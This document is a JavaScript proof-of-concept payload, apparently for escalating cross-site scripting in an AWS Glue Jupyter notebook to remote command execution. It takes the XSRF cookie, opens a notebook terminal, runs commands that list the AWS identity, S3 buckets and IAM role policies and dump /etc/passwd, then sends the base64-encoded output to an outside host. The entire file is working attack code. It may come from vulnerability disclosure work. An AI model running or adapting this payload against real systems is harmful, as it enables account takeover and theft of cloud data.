// Glue Notebook XSS to RCE - Full Exfiltration
(async function() {
    var config = JSON.parse(document.getElementById('jupyter-config-data').textContent);
    var baseUrl = config.baseUrl;
    
    function getCookie(name) {
        var value = "; " + document.cookie;
        var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
        return null;
    }
    
    var xsrf = getCookie('_xsrf');
    
    // Create terminal
    var terminal = await fetch(baseUrl + 'api/terminals', {
        method: 'POST',
        headers: {'Content-Type': 'application/json', 'X-XSRFToken': xsrf}
    }).then(r => r.json());
    
    var ws = new WebSocket('wss://' + location.host + baseUrl + 'terminals/websocket/' + terminal.name);
    var allOutput = "";
    
    ws.onopen = function() {
        var cmd = 'echo "=== GLUE XSS TO RCE ===" && echo "USER: $(whoami)" && echo "ID: $(id)" && echo "=== AWS IDENTITY ===" && python3 -c "import boto3,json; print(json.dumps(boto3.client(\'sts\').get_caller_identity(), default=str))" && echo "=== S3 BUCKETS ===" && python3 -c "import boto3; [print(b[\'Name\']) for b in boto3.client(\'s3\').list_buckets()[\'Buckets\'][:10]]" && echo "=== IAM ROLE ===" && python3 -c "import boto3; sts=boto3.client(\'sts\'); arn=sts.get_caller_identity()[\'Arn\']; role=arn.split(\'/\')[1] if \'assumed-role\' in arn else \'N/A\'; print(\'Role:\',role); iam=boto3.client(\'iam\'); [print(p[\'PolicyName\']) for p in iam.list_attached_role_policies(RoleName=role)[\'AttachedPolicies\']]" && echo "=== /etc/passwd ===" && cat /etc/passwd && echo "=== DONE ==="\r';
        
        ws.send(JSON.stringify(["stdin", cmd]));
    };
    
    ws.onmessage = function(e) {
        allOutput += e.data;
        
        if (e.data.includes("=== DONE ===")) {
            fetch('https://poc.heli9.com/log.php?type=glue_xss_rce', {
                method: 'POST',
                mode: 'no-cors',
                body: btoa(allOutput)
            });
        }
    };
})();